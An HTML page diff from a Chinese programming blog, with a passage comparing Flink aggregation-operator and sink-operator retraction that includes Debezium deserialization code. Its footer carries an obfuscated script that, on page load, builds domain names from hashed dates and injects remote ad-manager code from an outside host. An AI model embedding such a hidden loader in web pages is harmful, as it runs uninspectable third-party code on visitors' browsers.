+                        <span class="token punctuation">`</span>eincome<span class="token punctuation">`</span><span class="token operator">=</span><span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token punctuation">`</span>eincome<span class="token punctuation">`</span><span class="token punctuation">)</span>
+</code></pre> 
+<p>如果upsert操作不是原子的，很可能会发生并发问题，带来预料不到的后果。</p> 
+<h5><a id="213__VS_Sink_227"></a>2.1.3 聚合算子回撤 VS Sink算子回撤</h5> 
+<ol><li>原理不同</li></ol> 
+<p>聚合算子通过在state和cntState这两个状态分别维护中间聚合状态和某key所对应的消息数量（聚合消息+1，回撤消息-1），如果<code>cntState.value() = 1</code>，则下发最新的聚合消息；如果<code>cntState.value() = 0</code>，则将state中维护的上一次的聚合状态作为回撤消息进行下发。</p> 
+<p>Sink算子则是解析canal或debezium中的<code>op</code>字段，如果<code>op=create</code>，则取<code>after</code>字段中的有效数据进行下发；如果<code>op=update</code>，则分别取<code>before</code>和<code>after</code>中的有效数据进行下发；如果<code>op=delete</code>，则取<code>before</code>中的有效数据进行下发。</p> 
+<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">DebeziumJsonDeserializationSchema</span> <span class="token keyword">implements</span> <span class="token class-name">DeserializationSchema</span><span class="token generics function"><span class="token punctuation">&lt;</span>RowData<span class="token punctuation">&gt;</span></span> <span class="token punctuation">{<!-- --></span>
+	<span class="token annotation punctuation">@Override</span>
+	<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> message<span class="token punctuation">,</span> Collector<span class="token generics function"><span class="token punctuation">&lt;</span>RowData<span class="token punctuation">&gt;</span></span> out<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{<!-- --></span>
+    	GenericRowData row <span class="token operator">=</span> <span class="token punctuation">(</span>GenericRowData<span class="token punctuation">)</span> jsonDeserializer<span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
+			GenericRowData payload<span class="token punctuation">;</span>
+			<span class="token keyword">if</span> <span class="token punctuation">(</span>schemaInclude<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+				payload <span class="token operator">=</span> <span class="token punctuation">(</span>GenericRowData<span class="token punctuation">)</span> row<span class="token punctuation">.</span><span class="token function">getField</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
+				payload <span class="token operator">=</span> row<span class="token punctuation">;</span>
+			<span class="token punctuation">}</span>
+
+			GenericRowData before <span class="token operator">=</span> <span class="token punctuation">(</span>GenericRowData<span class="token punctuation">)</span> payload<span class="token punctuation">.</span><span class="token function">getField</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			GenericRowData after <span class="token operator">=</span> <span class="token punctuation">(</span>GenericRowData<span class="token punctuation">)</span> payload<span class="token punctuation">.</span><span class="token function">getField</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			String op <span class="token operator">=</span> payload<span class="token punctuation">.</span><span class="token function">getField</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token comment">// 关键逻辑</span>
+			<span class="token keyword">if</span> <span class="token punctuation">(</span>OP_CREATE<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>op<span class="token punctuation">)</span> <span class="token operator">||</span> OP_READ<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>op<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+				after<span class="token punctuation">.</span><span class="token function">setRowKind</span><span class="token punctuation">(</span>RowKind<span class="token punctuation">.</span>INSERT<span class="token punctuation">)</span><span class="token punctuation">;</span>
+				out<span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>after<span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>OP_UPDATE<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>op<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+				before<span class="token punctuation">.</span><span class="token function">setRowKind</span><span class="token punctuation">(</span>RowKind<span class="token punctuation">.</span>UPDATE_BEFORE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+				after<span class="token punctuation">.</span><span class="token function">setRowKind</span><span class="token punctuation">(</span>RowKind<span class="token punctuation">.</span>UPDATE_AFTER<span class="token punctuation">)</span><span class="token punctuation">;</span>
+				out<span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>before<span class="token punctuation">)</span><span class="token punctuation">;</span>
+				out<span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>after<span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>OP_DELETE<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>op<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+				before<span class="token punctuation">.</span><span class="token function">setRowKind</span><span class="token punctuation">(</span>RowKind<span class="token punctuation">.</span>DELETE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+				out<span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>before<span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
+				<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ignoreParseErrors<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+					<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IOException</span><span class="token punctuation">(</span><span class="token function">format</span><span class="token punctuation">(</span>
+						<span class="token string">"Unknown \"op\" value \"%s\". The Debezium JSON message is '%s'"</span><span class="token punctuation">,</span> op<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+				<span class="token punctuation">}</span>
+			<span class="token punctuation">}</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>最后，利用JDBC原子语句<code>ON DUPLICATE KEY UPDATE</code>实现upsert语义。</p> 
+<ol start="2"><li>数据结构不同</li></ol> 
+<p>聚合算子中的数据格式为<code>CRow</code></p> 
+<pre><code class="prism language-scala"><span class="token keyword">class</span> CRow<span class="token punctuation">(</span><span class="token keyword">var</span> row<span class="token operator">:</span> Row<span class="token punctuation">,</span> <span class="token keyword">var</span> change<span class="token operator">:</span> <span class="token builtin">Boolean</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>
+</code></pre> 
+<p>Sink算子中的数据结构为Row</p> 
+<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">GenericRowData</span> <span class="token keyword">implements</span> <span class="token class-name">RowData</span> <span class="token punctuation">{<!-- --></span>
+	<span class="token keyword">private</span> <span class="token keyword">final</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> fields<span class="token punctuation">;</span>
+  <span class="token comment">// Flink1.11新增的属性</span>
+	<span class="token keyword">private</span> RowKind kind<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token keyword">enum</span> RowKind <span class="token punctuation">{<!-- --></span>
+	<span class="token function">INSERT</span><span class="token punctuation">(</span><span class="token string">"+I"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+	<span class="token function">UPDATE_BEFORE</span><span class="token punctuation">(</span><span class="token string">"-U"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+	<span class="token function">UPDATE_AFTER</span><span class="token punctuation">(</span><span class="token string">"+U"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+	<span class="token function">DELETE</span><span class="token punctuation">(</span><span class="token string">"-D"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>结论：<br> 聚合算子和Sink算子关于回撤的概念相似，但原理不同且使用场景也不同，聚合算子的回撤用于聚合状态的更新，Sink算子的回撤则更多的是应用于CDC场景。<br> 聚合算子的撤回机制，保证了FlinkSQL持续查询/增量查询的正确语义；而Sink算子的回撤机制，保证了CDC场景下的正确语义。</p> 
+<blockquote> 
+ <p>参考：<br> https://ci.apache.org/projects/flink/flink-docs-release-1.11/dev/table/connectors/jdbc.html#how-to-create-a-jdbc-table<br> https://iteblog.blog.csdn.net/article/details/108656414<br> https://zhuanlan.zhihu.com/p/242340792</p> 
+</blockquote>
+                </div>
+		</div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/5f1acf83707950480dea077eb3f22de5/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">Python数学实验与建模 课后习题第2章解析</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/8ad08229bd5c7f4a8b6b6b9ed9f46c4e/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">c语言程序源代码_程序员需要了解的硬核知识之汇编语言(全)</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2024 编程爱好者博客.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+
+<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
+<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
